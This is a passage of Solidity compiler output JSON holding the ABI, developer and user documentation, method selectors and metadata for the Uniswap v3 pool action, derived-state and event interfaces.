									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							}
						},
						"title": "Permissionless pool actions",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"swap(address,bool,int256,uint160,bytes)": "128acb08"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}}},\"title\":\"Permissionless pool actions\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"}},\"notice\":\"Contains pool methods that can be called by anyone\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":\"IUniswapV3PoolActions\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							}
						},
						"notice": "Contains pool methods that can be called by anyone",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"IUniswapV3PoolDerivedState": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							}
						},
						"title": "Pool state that is not stored",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"observe(uint32[])": "883bdbfd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}}},\"title\":\"Pool state that is not stored\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"}},\"notice\":\"Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs.\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":\"IUniswapV3PoolDerivedState\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							}
						},
						"notice": "Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs.",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"IUniswapV3PoolEvents": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
							"type": "event"
						}
					],
					"devdoc": {
						"events": {
							"Burn(address,int24,int24,uint128,uint256,uint256)": {
								"details": "Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect",
								"params": {
									"amount": "The amount of liquidity to remove",
									"amount0": "The amount of token0 withdrawn",
									"amount1": "The amount of token1 withdrawn",
									"owner": "The owner of the position for which liquidity is removed",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
